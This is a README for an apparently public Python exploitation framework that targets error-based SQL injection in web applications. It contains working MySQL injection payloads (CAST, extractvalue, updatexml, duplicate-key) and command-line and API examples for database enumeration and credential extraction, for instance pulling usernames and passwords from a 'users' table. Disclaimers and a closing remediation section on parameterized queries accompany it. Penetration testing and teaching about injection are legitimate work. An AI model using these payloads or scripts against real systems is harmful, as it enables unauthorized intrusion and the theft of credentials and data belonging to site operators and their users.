# Error-Based SQL Injection Exploitation Framework

![Python](https://img.shields.io/badge/Python-3.7+-blue.svg)
![License](https://img.shields.io/badge/License-MIT-green.svg)
![Status](https://img.shields.io/badge/Status-Production%20Ready-brightgreen.svg)
![Security](https://img.shields.io/badge/Security-CRITICAL-red.svg)

Professional-grade error-based SQL injection exploitation and assessment framework. Built for authorized security testing and vulnerability assessment.

**⚠️ DISCLAIMER**: This tool is designed for authorized security testing only. Unauthorized access to computer systems is illegal.

---

## 📋 Table of Contents

- [Overview](#overview)
- [Features](#features)
- [Requirements](#requirements)
- [Installation](#installation)
- [Quick Start](#quick-start)
- [Usage Examples](#usage-examples)
- [Technical Details](#technical-details)
- [API Reference](#api-reference)
- [Vulnerability Analysis](#vulnerability-analysis)
- [Remediation Guide](#remediation-guide)
- [Contributing](#contributing)
- [License](#license)

---

## Overview

This framework demonstrates and exploits error-based SQL injection vulnerabilities in web applications. It provides automated vulnerability detection, database enumeration, and data extraction capabilities.

### Target Vulnerability

**Type**: Visible Error-Based SQL Injection  
**CWE**: CWE-89 (SQL Injection)  
**CVSS v3.1**: 9.8 (Critical)  
**OWASP**: A03:2021 – Injection

### What is Error-Based SQL Injection?

Error-based SQL injection exploits database error messages to extract sensitive information. Unlike blind SQL injection that relies on boolean conditions, error-based techniques force the database to generate error messages containing data.

**Example**:
```sql
-- Normal query
SELECT * FROM products WHERE id = 1;

-- Vulnerable to error-based SQLi
SELECT * FROM products WHERE id = 1' AND CAST((SELECT username FROM users) AS int) -- -;

-- Generates error: "Incorrect integer value: 'admin'"
-- Attacker extracts 'admin' from error message
```

---

## Features

### Core Capabilities

- ✅ **Vulnerability Detection** - Automated testing for error-based SQLi
- ✅ **Database Enumeration** - Extract database name, version, user
- ✅ **Table Discovery** - Find all tables in target database
- ✅ **Column Extraction** - Identify column names and structure
- ✅ **Data Extraction** - Retrieve sensitive information
- ✅ **Credential Harvesting** - Extract usernames and passwords
- ✅ **Error Message Parsing** - Intelligent error pattern recognition
- ✅ **Professional Reporting** - CVSS scores, remediation, impact analysis
- ✅ **JSON Export** - Machine-readable results
- ✅ **Comprehensive Logging** - Full operation audit trail

### Advanced Features

- Session management and cookie handling
- Custom payload crafting
- Multiple error pattern detection
- Response analysis and comparison
- Database version detection
- User privilege enumeration
- Automated table structure mapping

---

## Requirements

### System Requirements

- **Python**: 3.7+
- **OS**: Linux, macOS, Windows
- **RAM**: 512MB minimum
- **Network**: Internet connectivity to target

### Python Dependencies

```
requests>=2.25.0
urllib3>=1.26.0
```

### Target Requirements

- Vulnerable web application with error-based SQLi
- Accessible endpoints
- Database with information_schema (MySQL/MariaDB)

---

## Installation

### Method 1: Clone Repository

```bash
git clone https://github.com/security-researcher/error-based-sqli-exploit.git
cd error-based-sqli-exploit
pip install -r requirements.txt
```

### Method 2: Direct Download

```bash
wget https://raw.githubusercontent.com/security-researcher/error-based-sqli-exploit/main/error_based_sqli_exploit.py
pip install requests urllib3
```

### Method 3: Docker

```bash
docker build -t sqli-exploit .
docker run -it sqli-exploit
```

### Verify Installation

```bash
python3 error_based_sqli_exploit.py --version
```

---

## Quick Start

### Basic Usage

```python
from error_based_sqli_exploit import ErrorBasedSQLiExploit

# Initialize framework
exploit = ErrorBasedSQLiExploit("https://target.com")

# Test vulnerability
if exploit.test_vulnerability(endpoint="/product", param="id"):
    print("Target is vulnerable!")
    
    # Enumerate database
    db_info = exploit.enumerate_database()
    print(f"Database: {db_info['name']}")
    
    # Extract tables
    tables = exploit.extract_table_names()
    print(f"Tables: {tables}")
    
    # Generate report
    exploit.save_report('vulnerability_report.txt')
```

### Command Line Usage

```bash
# Test for vulnerability
python3 error_based_sqli_exploit.py -u https://target.com -e /product -p id

# Full enumeration
python3 error_based_sqli_exploit.py -u https://target.com --enumerate

# Extract credentials
python3 error_based_sqli_exploit.py -u https://target.com --extract-creds users username password

# Generate report
python3 error_based_sqli_exploit.py -u https://target.com --report output.txt
```

---

## Usage Examples

### Example 1: Basic Vulnerability Assessment

```python
#!/usr/bin/env python3
"""
Basic vulnerability assessment example
"""

from error_based_sqli_exploit import ErrorBasedSQLiExploit

def main():
    target = "https://vulnerable-app.local"
    
    # Initialize
    exploit = ErrorBasedSQLiExploit(target)
    
    # Test endpoint
    endpoint = "/product"
    parameter = "id"
    
    print(f"[*] Testing {endpoint}?{parameter}=1 for SQL injection...")
    
    if exploit.test_vulnerability(endpoint, parameter):
        print("[+] SQL Injection confirmed!")
        
        # Get database info
        db_info = exploit.enumerate_database(endpoint, parameter)
        print(f"[+] Database: {db_info}")
        
        # Generate report
        exploit.save_report()
        print("[+] Report saved to error_based_sqli_report.txt")

if __name__ == "__main__":
    main()
```

### Example 2: Complete Database Enumeration

```python
#!/usr/bin/env python3
"""
Comprehensive database enumeration
"""

from error_based_sqli_exploit import ErrorBasedSQLiExploit
import json

def enumerate_target(target_url, endpoint, param):
    exploit = ErrorBasedSQLiExploit(target_url)
    
    # 1. Confirm vulnerability
    if not exploit.test_vulnerability(endpoint, param):
        print("Target not vulnerable")
        return
    
    # 2. Extract database information
    print("[*] Extracting database information...")
    db_info = exploit.enumerate_database(endpoint, param)
    print(json.dumps(db_info, indent=2))
    
    # 3. Find all tables
    print("[*] Discovering tables...")
    tables = exploit.extract_table_names(endpoint, param)
    
    # 4. Extract columns for each table
    print("[*] Extracting columns...")
    for table in tables:
        columns = exploit.extract_columns(table, endpoint, param)
        print(f"{table}: {columns}")
    
    # 5. Generate comprehensive report
    print("[*] Generating report...")
    exploit.save_report('comprehensive_assessment.txt')
    exploit.export_json('assessment_results.json')
    
    print("[+] Assessment complete!")

if __name__ == "__main__":
    enumerate_target(
        "https://target.com",
        "/product",
        "id"
    )
```

### Example 3: Credential Extraction

```python
#!/usr/bin/env python3
"""
Extract credentials from database
"""

from error_based_sqli_exploit import ErrorBasedSQLiExploit

def extract_credentials(target_url, endpoint, param, table, user_col, pass_col):
    exploit = ErrorBasedSQLiExploit(target_url)
    
    # Verify vulnerability
    if not exploit.test_vulnerability(endpoint, param):
        print("[-] Target not vulnerable")
        return None
    
    # Extract credentials
    print(f"[*] Attempting to extract credentials from {table}...")
    credentials = exploit.extract_credentials(
        table=table,
        username_col=user_col,
        password_col=pass_col,
        endpoint=endpoint,
        param=param
    )
    
    if credentials:
        print("[+] Credentials found:")
        for cred in credentials:
            print(f"    Username: {cred['username']}")
            print(f"    Password: {cred['password']}")
        return credentials
    else:
        print("[-] No credentials found")
        return None

if __name__ == "__main__":
    extract_credentials(
        "https://vulnerable-app.local",
        "/product",
        "id",
        "users",
        "username",
        "password"
    )
```

---

## Technical Details

### Error-Based SQLi Techniques

#### 1. CAST Function Method

```sql
1' AND CAST((SELECT database()) AS int) -- -
```

Forces conversion of string to integer, generating error with data.

#### 2. Extractvalue Method

```sql
1' AND extractvalue(1, concat(0x7e, (SELECT database()))) -- -
```

XML parsing error reveals subquery result.

#### 3. UpdateXML Method

```sql
1' AND updatexml(1, concat(0x7e, (SELECT database())), 1) -- -
```

XML update error contains extracted data.

#### 4. Duplicate Key Method

```sql
1' UNION SELECT 1,2,3 ON DUPLICATE KEY UPDATE c=concat(0x7e,(SELECT database())) -- -
```

Duplicate key violation error reveals data.

### Database Version Detection

The framework detects:
- MySQL/MariaDB
- PostgreSQL
- SQL Server
- Oracle
- SQLite

Each database has unique error messages and functions that are exploited.

### Error Pattern Recognition

Multi-pattern error detection:
- SQL error messages
- Cast/conversion errors
- Constraint violation errors
- XML processing errors
- Duplicate key errors

---

## API Reference

### Class: ErrorBasedSQLiExploit

#### `__init__(base_url: str)`

Initialize the exploitation framework.

**Parameters:**
- `base_url` (str): Target URL without trailing slash

**Example:**
```python
exploit = ErrorBasedSQLiExploit("https://target.com")
```

#### `test_vulnerability(endpoint: str, param: str) -> bool`

Test if parameter is vulnerable to error-based SQLi.

**Parameters:**
- `endpoint` (str): API endpoint to test
- `param` (str): Parameter name to test

**Returns:** True if vulnerable, False otherwise

**Example:**
```python
if exploit.test_vulnerability("/product", "id"):
    print("Vulnerable!")
```

#### `enumerate_database(endpoint: str, param: str) -> Dict`

Extract database information (name, version, user).

**Returns:** Dictionary with database info

**Example:**
```python
db_info = exploit.enumerate_database("/product", "id")
print(db_info['name'])  # Database name
print(db_info['version'])  # Version
print(db_info['current_user'])  # Current user
```

#### `extract_table_names(endpoint: str, param: str) -> List[str]`

Extract all table names from database.

**Returns:** List of table names

**Example:**
```python
tables = exploit.extract_table_names("/product", "id")
for table in tables:
    print(table)
```

#### `extract_columns(table_name: str, endpoint: str, param: str) -> List[str]`

Extract column names from specific table.

**Parameters:**
- `table_name` (str): Target table name

**Returns:** List of column names

**Example:**
```python
columns = exploit.extract_columns("users", "/product", "id")
print(columns)  # ['id', 'username', 'password', 'email']
```

#### `extract_credentials(table: str, username_col: str, password_col: str, endpoint: str, param: str) -> List[Dict]`

Extract credentials from database.

**Parameters:**
- `table` (str): Table containing credentials
- `username_col` (str): Username column name
- `password_col` (str): Password column name

**Returns:** List of dictionaries with username/password

**Example:**
```python
creds = exploit.extract_credentials(
    "users",
    "username",
    "password",
    "/product",
    "id"
)
for cred in creds:
    print(f"{cred['username']}:{cred['password']}")
```

#### `generate_report() -> str`

Generate professional vulnerability report.

**Returns:** Formatted report string

**Example:**
```python
report = exploit.generate_report()
print(report)
```

#### `save_report(filename: str) -> None`

Save report to file.

**Parameters:**
- `filename` (str): Output filename (default: error_based_sqli_report.txt)

**Example:**
```python
exploit.save_report("vulnerability_assessment.txt")
```

#### `export_json(filename: str) -> None`

Export results to JSON.

**Parameters:**
- `filename` (str): Output filename (default: sqli_results.json)

**Example:**
```python
exploit.export_json("results.json")
```

---

## Vulnerability Analysis

### How Error-Based SQLi Works

```
1. Attacker sends malicious input
   Input: 1' AND CAST((SELECT username FROM users LIMIT 1) AS int) -- -

2. Application concatenates into SQL query
   Query: SELECT * FROM products WHERE id = 1' AND CAST((SELECT username FROM users LIMIT 1) AS int) -- -

3. Database executes invalid query
   MySQL attempts to convert 'admin' (string) to integer (int)

4. Database generates error message
   Error: "Incorrect integer value: 'admin' for column 'id' at row 1"

5. Application displays error to user (VULNERABLE!)
   Error message shown in response

6. Attacker extracts data from error message
   Result: Extracted username 'admin'
```

### Attack Flow

```
┌─────────────────────────────────────────────────────┐
│ 1. Reconnaissance & Mapping                         │
│    - Identify endpoints                             │
│    - Find parameters                                │
│    - Test basic injection                           │
└──────────────────┬──────────────────────────────────┘
                   │
                   ▼
┌─────────────────────────────────────────────────────┐
│ 2. Vulnerability Confirmation                       │
│    - Send test payloads                             │
│    - Analyze error messages                         │
│    - Identify vulnerable parameter                  │
└──────────────────┬──────────────────────────────────┘
                   │
                   ▼
┌─────────────────────────────────────────────────────┐
│ 3. Database Enumeration                             │
│    - Extract database name                          │
│    - Get database version                           │
│    - Find current user                              │
└──────────────────┬──────────────────────────────────┘
                   │
                   ▼
┌─────────────────────────────────────────────────────┐
│ 4. Structure Discovery                              │
│    - List all tables                                │
│    - Extract column names                           │
│    - Map database schema                            │
└──────────────────┬──────────────────────────────────┘
                   │
                   ▼
┌─────────────────────────────────────────────────────┐
│ 5. Data Extraction                                  │
│    - Extract credentials                            │
│    - Harvest sensitive data                         │
│    - Export results                                 │
└──────────────────┬──────────────────────────────────┘
                   │
                   ▼
┌─────────────────────────────────────────────────────┐
│ 6. Reporting & Documentation                        │
│    - Generate professional report                   │
│    - CVSS scoring                                   │
│    - Remediation recommendations                    │
└─────────────────────────────────────────────────────┘
```

---

## Remediation Guide

### Vulnerable Code Example

```php
<?php
// VULNERABLE - DO NOT USE
$id = $_GET['id'];
$query = "SELECT * FROM products WHERE id = " . $id;
$result = mysqli_query($connection, $query);

// Output error messages (VULNERABLE!)
if ($error = mysqli_error($connection)) {
    echo "Error: " . $error;  // Displays SQL errors to user
}
?>
```

### Secure Code Solutions

#### Solution 1: Parameterized Queries (RECOMMENDED)

```php
<?php
// SECURE - Parameterized Query
$id = $_GET['id'];
$query = "SELECT * FROM products WHERE id = ?";
$stmt = $connection->prepare($query);
$stmt->bind_param("i", $id);
$stmt->execute();
$result = $stmt->get_result();

// Generic error message
if (!$result) {
    error_log("Database error: " . $connection->error);
    echo "An error occurred. Please try again later.";
}
?>
```

#### Solution 2: ORM Framework

```php
<?php
// Using Doctrine ORM (SECURE)
$product = $em->getRepository('Product')->find($_GET['id']);

// Prevents SQL injection automatically
if (!$product) {
    throw new NotFoundHttpException('Product not found');
}
?>
```

#### Solution 3: Prepared Statements (Python)

```python
# SECURE - Python with prepared statements
import mysql.connector

connection = mysql.connector.connect(
    host="localhost",
    user="user",
    password="password",
    database="shop"
)

cursor = connection.cursor(prepared=True)
user_id = request.args.get('id')

# Use parameterized query
query = "SELECT * FROM products WHERE id = %s"
cursor.execute(query, (user_id,))
results = cursor.fetchall()
```

### Defense Checklist

- [ ] **Input Validation**: Validate all user input
- [ ] **Parameterized Queries**: Use prepared statements
- [ ] **Principle of Least Privilege**: Limit database user permissions
- [ ] **Error Handling**: Don't expose SQL errors to users
- [ ] **WAF Rules**: Implement Web Application Firewall
- [ ] **Logging**: Log all database errors
- [ ] **Code Review**: Security code review process
- [ ] **Testing**: Regular security testing
- [ ] **Updates**: Keep software updated
- [ ] **Monitoring**: Monitor for attack patterns

---

## Contributing

### Development Setup

```bash
# Clone repository
git clone https://github.com/security-researcher/error-based-sqli-exploit.git
cd error-based-sqli-exploit

# Create virtual environment
python3 -m venv venv
source venv/bin/activate  # On Windows: venv\Scripts\activate

# Install dependencies
pip install -r requirements.txt
pip install -r requirements-dev.txt

# Run tests
pytest tests/

# Run linting
flake8 error_based_sqli_exploit.py
pylint error_based_sqli_exploit.py
```

### Contributing Guidelines

1. Fork the repository
2. Create feature branch (`git checkout -b feature/improvement`)
3. Commit changes (`git commit -am 'Add improvement'`)
4. Push to branch (`git push origin feature/improvement`)
5. Submit Pull Request

### Code Style

- Follow PEP 8
- Add docstrings to all functions
- Include type hints
- Write unit tests
- Update README

---

## License

MIT License - See LICENSE file for details

```
MIT License

Copyright (c) 2024 Security Researcher

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.
```

---

## Disclaimer

This software is provided for authorized security testing and educational purposes only. Unauthorized access to computer systems is illegal. Users are responsible for ensuring they have proper authorization before using this tool.

**The authors assume no liability for misuse or damage caused by this software.**

---

## References

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [PortSwigger SQL Injection](https://portswigger.net/web-security/sql-injection)
- [MySQL Documentation](https://dev.mysql.com/doc/)
- [OWASP Top 10 2021](https://owasp.org/Top10/)

---

## Contact & Support

- **Issues**: GitHub Issues
- **Discussions**: GitHub Discussions
- **Email**: security@example.com
- **Twitter**: @SecurityResearcher

---

**⭐ If you found this useful, please star the repository!**

**Built with ❤️ for the security community**
